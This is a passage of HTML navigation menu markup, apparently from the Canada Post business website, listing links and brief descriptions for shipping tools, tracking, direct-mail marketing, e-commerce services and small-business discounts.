      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/compare-shipping-tools.page?" class="" target="" alt="">Choose a shipping tool</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/compare-shipping-tools.page?" target="" alt="">
        <h3 class="submenu-header">Choose a shipping tool<span class="open-new-window"></span></h3>
        <p>Compare our 3 shipping tools to find the tool for your business.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/track-find.page?" class="menu-title parent-link" target="" alt="">Track and find</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/track-find.page?" target="" alt="">
          <h3 class="submenu-header">Track and find<span class="open-new-window"></span></h3>
          <p>Quick links to online tools.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="https://www.canadapost-postescanada.ca/track-reperage/en" class="" target="" alt="">Track a package</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/track-reperage/en" target="" alt="">
        <h3 class="submenu-header">Track a package<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/info/mc/personal/postalcode/fpc.jsf" class="" target="" alt="">Find a postal code</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/info/mc/personal/postalcode/fpc.jsf" target="" alt="">
        <h3 class="submenu-header">Find a postal code<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/info/mc/personal/postalcode/fpc.jsf" class="" target="" alt="">Find an address</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/info/mc/personal/postalcode/fpc.jsf" target="" alt="">
        <h3 class="submenu-header">Find an address<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/information/app/fpo/personal/findpostoffice" class="" target="" alt="">Find a post office</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/information/app/fpo/personal/findpostoffice" target="" alt="">
        <h3 class="submenu-header">Find a post office<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/information/app/fdl/business/findDepositLocation" class="" target="" alt="">Find a drop-off location</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/information/app/fdl/business/findDepositLocation" target="" alt="">
        <h3 class="submenu-header">Find a drop-off location<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/tools/delivery-standards.page?" class="" target="" alt="">Find a delivery standard</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/tools/delivery-standards.page?" target="" alt="">
        <h3 class="submenu-header">Find a delivery standard<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/package-redirection.page?" class="" target="" alt="">Package Redirection</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/package-redirection.page?" target="" alt="">
        <h3 class="submenu-header">Package Redirection<span class="open-new-window"></span></h3>
        <p>Redirect a shipment while in transit.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/track-find.page?" class="menu-title parent-link" target="" alt="">Access our quick tools</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/track-find.page?" target="" alt="">
          <h3 class="submenu-header">Access our quick tools<span class="open-new-window"></span></h3>
          <p>Quick links to track your parcel, find an address or postal code.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/find-rates-ship/snap-ship.page?" class="" target="" alt="">Snap Ship</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/find-rates-ship/snap-ship.page?" target="" alt="">
        <h3 class="submenu-header">Snap Ship<span class="open-new-window"></span></h3>
        <p>Online shipping tool best for small businesses.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/find-rates-ship/shipping-manager.page?" class="" target="" alt="">Shipping Manager</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/find-rates-ship/shipping-manager.page?" target="" alt="">
        <h3 class="submenu-header">Shipping Manager<span class="open-new-window"></span></h3>
        <p>Online shipping tool for large volume shippers with a parcels contract.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/request-pickup.page?" class="" target="" alt="">Request a pickup</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/request-pickup.page?" target="" alt="">
        <h3 class="submenu-header">Request a pickup<span class="open-new-window"></span></h3>
        <p>Have us pick up packages from your business for shipping.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/returns.page?" class="menu-title parent-link" target="" alt="">Simplify returns</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/returns.page?" target="" alt="">
          <h3 class="submenu-header">Simplify returns<span class="open-new-window"></span></h3>
          <p>Learn about how to create a returns strategy for your customers.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/returns/customer-return-policy.page?" class="" target="" alt="">Customer return policy</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/returns/customer-return-policy.page?" target="" alt="">
        <h3 class="submenu-header">Customer return policy<span class="open-new-window"></span></h3>
        <p>Create and manage return policies online, for free.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/blogs/business/category/shipping/" class="menu-title " target="_blank" alt="Opens in new tab">Get shipping resources and articles</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/blogs/business/category/shipping/" target="_blank" alt="Opens in new tab">
          <h3 class="submenu-header">Get shipping resources and articles<span class="open-new-window"></span></h3>
          <p>Business Matters blog.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
              </ul>
            </div>
          </li>
    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing.page?" class="parent-link" target="" alt="">Marketing</a>
            <div class="menu-item-level level1" data-level="2">
              <div class="menu-overview">
              <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing.page?" target="" alt="">
              <h3 class="submenu-header">Marketing<span class="open-new-window"></span></h3>
                <p>Learn about direct mail campaigns and renting address data.</p>
              </a>
              </div> 
              <ul>
                
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/campaign.page?" class="menu-title parent-link" target="" alt="">Launch a campaign</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/campaign.page?" target="" alt="">
          <h3 class="submenu-header">Launch a campaign<span class="open-new-window"></span></h3>
          <p>Compare our direct mail services to match your campaign goals.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/campaign/reach-every-mailbox.page?" class="parent-link" target="" alt="">Reach every mailbox</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/campaign/reach-every-mailbox.page?" target="" alt="">
        <h3 class="submenu-header">Reach every mailbox<span class="open-new-window"></span></h3>
        <p>Create a direct mail campaign online or with the help of a partner.</p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter.page?" class="parent-link" target="" alt="">Precision Targeter</a>
          <div class="menu-item-level level4" data-level="5">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter.page?" target="" alt="">
            <h3 class="submenu-header">Precision Targeter<span class="open-new-window"></span></h3>
            <p>Learn how to target the right audience for your campaign.</p>
            </a>
            </div> 
            <ul>
            
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter/get-to-the-tool.page?" class="" target="" alt="">Get to the tool</a>
      <div class="menu-hide level4">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter/get-to-the-tool.page?" target="" alt="">Get to the tool</a>
        <ul>
          
        </ul>              
      </div>
    </li>   
    
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter/create-mailing-plan.page?" class="" target="" alt="">Create a mailing plan</a>
      <div class="menu-hide level4">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter/create-mailing-plan.page?" target="" alt="">Create a mailing plan</a>
        <ul>
          
        </ul>              
      </div>
    </li>   
    
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter/review-your-mailing-plan.page?" class="" target="" alt="">Review your mailing plan</a>
      <div class="menu-hide level4">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter/review-your-mailing-plan.page?" target="" alt="">Review your mailing plan</a>
        <ul>
          
        </ul>              
      </div>
    </li>   
    
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter/map-buttons.page?" class="" target="" alt="">Map buttons</a>
      <div class="menu-hide level4">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter/map-buttons.page?" target="" alt="">Map buttons</a>
        <ul>
          
        </ul>              
      </div>
    </li>   
    
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter/data-view-buttons.page?" class="" target="" alt="">Data view buttons</a>
      <div class="menu-hide level4">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter/data-view-buttons.page?" target="" alt="">Data view buttons</a>
        <ul>
          
        </ul>              
      </div>
    </li>   
    
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter/menu-buttons.page?" class="" target="" alt="">Menu buttons</a>
      <div class="menu-hide level4">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter/menu-buttons.page?" target="" alt="">Menu buttons</a>
        <ul>
          
        </ul>              
      </div>
    </li>   
    
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="https://www.canadapost-postescanada.ca/sam/" class="" target="" alt="">Snap Admail</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/sam/" target="" alt="">
            <h3 class="submenu-header">Snap Admail<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/tools/marketing/find-a-partner.page?" class="" target="" alt="">Find a partner</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/tools/marketing/find-a-partner.page?" target="" alt="">
            <h3 class="submenu-header">Find a partner<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter.page?" class="" target="" alt="">Precision Targeter</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter.page?" target="" alt="">
            <h3 class="submenu-header">Precision Targeter<span class="open-new-window"></span></h3>
            <p>Precision Targeter</p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/campaign/discover-similar-customers.page?" class="" target="" alt="">Discover similar customers</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/campaign/discover-similar-customers.page?" target="" alt="">
        <h3 class="submenu-header">Discover similar customers<span class="open-new-window"></span></h3>
        <p>Effectively target potential customers using postal code data.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/campaign/send-personalized-mail.page?" class="" target="" alt="">Send Personalized Mail</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/campaign/send-personalized-mail.page?" target="" alt="">
        <h3 class="submenu-header">Send Personalized Mail<span class="open-new-window"></span></h3>
        <p>Launch a campaign with personalized, addressed direct mail.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/campaign/why-direct-mail-marketing.page?" class="" target="" alt="">Why direct mail marketing?</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/campaign/why-direct-mail-marketing.page?" target="" alt="">
        <h3 class="submenu-header">Why direct mail marketing?<span class="open-new-window"></span></h3>
        <p>Our research shows how direct mail supports marketing campaigns.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/audience.page?" class="menu-title parent-link" target="" alt="">Audience insights and solutions</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/audience.page?" target="" alt="">
          <h3 class="submenu-header">Audience insights and solutions<span class="open-new-window"></span></h3>
          <p>Access targeted customer lists to boost your sales.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/audience/rent-list.page?" class="parent-link" target="" alt="">Rent our prospect lists</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/audience/rent-list.page?" target="" alt="">
        <h3 class="submenu-header">Rent our prospect lists<span class="open-new-window"></span></h3>
        <p>Use the most current address data to target and segment customers.</p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/audience/clean-list.page?" class="" target="" alt="">NCOA Mover Data</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/audience/clean-list.page?" target="" alt="">
            <h3 class="submenu-header">NCOA Mover Data<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/audience/clean-list.page?" class="parent-link" target="" alt="">Clean your customer lists</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/audience/clean-list.page?" target="" alt="">
        <h3 class="submenu-header">Clean your customer lists<span class="open-new-window"></span></h3>
        <p>Learn about services that increase the accuracy of customer data.  </p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/audience/clean-your-customer-lists/ncoa-mover-data-service.page?" class="" target="" alt="">NCOA mover data service</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/audience/clean-your-customer-lists/ncoa-mover-data-service.page?" target="" alt="">
            <h3 class="submenu-header">NCOA mover data service<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/audience/insights.page?" class="" target="" alt="">Get audience insights</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/audience/insights.page?" target="" alt="">
        <h3 class="submenu-header">Get audience insights<span class="open-new-window"></span></h3>
        <p>Analyze campaign data to optimize future campaigns.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/audience/license-data.page?" class="" target="" alt="">License our data</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/audience/license-data.page?" target="" alt="">
        <h3 class="submenu-header">License our data<span class="open-new-window"></span></h3>
        <p>Use our data products to create your campaign mailing lists.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/blogs/business/category/marketing/" class="menu-title " target="_blank" alt="Opens in new tab">Get marketing resources and articles</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/blogs/business/category/marketing/" target="_blank" alt="Opens in new tab">
          <h3 class="submenu-header">Get marketing resources and articles<span class="open-new-window"></span></h3>
          <p>Business Matters blog.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
              </ul>
            </div>
          </li>
    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/business/ecommerce.page?" class="parent-link" target="" alt="">E-commerce</a>
            <div class="menu-item-level level1" data-level="2">
              <div class="menu-overview">
              <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/ecommerce.page?" target="" alt="">
              <h3 class="submenu-header">E-commerce<span class="open-new-window"></span></h3>
                <p>Learn about services to support your online business for customers.</p>
              </a>
              </div> 
              <ul>
                
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/business/ecommerce/start-selling-online.page?" class="menu-title " target="" alt="">Start selling online</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/ecommerce/start-selling-online.page?" target="" alt="">
          <h3 class="submenu-header">Start selling online<span class="open-new-window"></span></h3>
          <p>Learn about setting up your online store with our partners.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/business/ecommerce/ecommerce-awards/home.page" class="menu-title " target="_blank" alt="Opens in new tab">E-commerce Innovation Awards</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/ecommerce/ecommerce-awards/home.page" target="_blank" alt="Opens in new tab">
          <h3 class="submenu-header">E-commerce Innovation Awards<span class="open-new-window"></span></h3>
          <p></p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/business/ecommerce/enhance.page?" class="menu-title parent-link" target="" alt="">Enhance your e-commerce operations</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/ecommerce/enhance.page?" target="" alt="">
          <h3 class="submenu-header">Enhance your e-commerce operations<span class="open-new-window"></span></h3>
          <p>Learn about services to enable online purchase, delivery and returns.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/ecommerce/enhance/verify-addresses.page?" class="" target="" alt="">Verify customer addresses</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/ecommerce/enhance/verify-addresses.page?" target="" alt="">
        <h3 class="submenu-header">Verify customer addresses<span class="open-new-window"></span></h3>
        <p>Integrate AddressComplete™ to improve your online checkout experience.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/ecommerce/enhance/display-rates-delivery-dates.page?" class="" target="" alt="">Display rates and delivery dates</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/ecommerce/enhance/display-rates-delivery-dates.page?" target="" alt="">
        <h3 class="submenu-header">Display rates and delivery dates<span class="open-new-window"></span></h3>
        <p>Integrate shipping costs and speeds directly in your online checkout.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/request-pickup.page?" class="" target="" alt="">Request a pickup</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/request-pickup.page?" target="" alt="">
        <h3 class="submenu-header">Request a pickup<span class="open-new-window"></span></h3>
        <p>Have us pick up packages from your business for shipping.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/ecommerce/enhance/parcel-tracking.page?" class="" target="" alt="">Provide parcel tracking</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/ecommerce/enhance/parcel-tracking.page?" target="" alt="">
        <h3 class="submenu-header">Provide parcel tracking<span class="open-new-window"></span></h3>
        <p>Add tracking to your website and let customers track their purchase.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/ecommerce/enhance/ship-from-store.page?" class="" target="" alt="">Ship from a store</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/ecommerce/enhance/ship-from-store.page?" target="" alt="">
        <h3 class="submenu-header">Ship from a store<span class="open-new-window"></span></h3>
        <p>Ship online purchases to customers from the closest retail store.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/ecommerce/enhance/deliver-to-post-office.page?" class="" target="" alt="">Deliver to a post office</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/ecommerce/enhance/deliver-to-post-office.page?" target="" alt="">
        <h3 class="submenu-header">Deliver to a post office<span class="open-new-window"></span></h3>
        <p>Offer post office pickup of purchases to your customers.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/returns.page?" class="" target="" alt="">Simplify returns</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/returns.page?" target="" alt="">
        <h3 class="submenu-header">Simplify returns<span class="open-new-window"></span></h3>
        <p>Create the best returns experience for your customers.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/business/ecommerce/integrate-apis.page?" class="menu-title " target="" alt="">Integrate with our APIs</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/ecommerce/integrate-apis.page?" target="" alt="">
          <h3 class="submenu-header">Integrate with our APIs<span class="open-new-window"></span></h3>
          <p>Use free APIs to integrate our services directly with your website.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/blogs/business/category/ecommerce/" class="menu-title " target="_blank" alt="Opens in new tab">Get e-commerce resources and articles</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/blogs/business/category/ecommerce/" target="_blank" alt="Opens in new tab">
          <h3 class="submenu-header">Get e-commerce resources and articles<span class="open-new-window"></span></h3>
          <p>Business Matters blog.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
              </ul>
            </div>
          </li>
    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/business/small-business.page?" class="parent-link" target="" alt="">Small business</a>
            <div class="menu-item-level level1" data-level="2">
              <div class="menu-overview">
              <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/small-business.page?" target="" alt="">
              <h3 class="submenu-header">Small business<span class="open-new-window"></span></h3>
                <p>Learn about shipping tools and discounts tailored for small business.</p>
              </a>
              </div> 
              <ul>
                
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/business/small-business/shipping-discounts.page?" class="menu-title " target="" alt="">Shipping discounts</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/small-business/shipping-discounts.page?" target="" alt="">
          <h3 class="submenu-header">Shipping discounts<span class="open-new-window"></span></h3>
          <p>Learn about savings program discount levels.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/business/ecommerce/start-selling-online.page?" class="menu-title " target="" alt="">Start selling online</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/ecommerce/start-selling-online.page?" target="" alt="">
          <h3 class="submenu-header">Start selling online<span class="open-new-window"></span></h3>
          <p>Learn about setting up your online store with our partners. </p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/business/small-business/third-party-discounts.page?" class="menu-title " target="" alt="">Exclusive discounts</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/small-business/third-party-discounts.page?" target="" alt="">
          <h3 class="submenu-header">Exclusive discounts<span class="open-new-window"></span></h3>
          <p></p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/business/small-business/direct-mail-savings.page?" class="menu-title " target="" alt="">Direct mail discounts</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/small-business/direct-mail-savings.page?" target="" alt="">
          <h3 class="submenu-header">Direct mail discounts<span class="open-new-window"></span></h3>
          <p>Learn about small business savings on direct mail marketing campaigns.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/find-rates-ship/snap-ship.page?" class="menu-title " target="" alt="">Snap Ship</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/find-rates-ship/snap-ship.page?" target="" alt="">
          <h3 class="submenu-header">Snap Ship<span class="open-new-window"></span></h3>
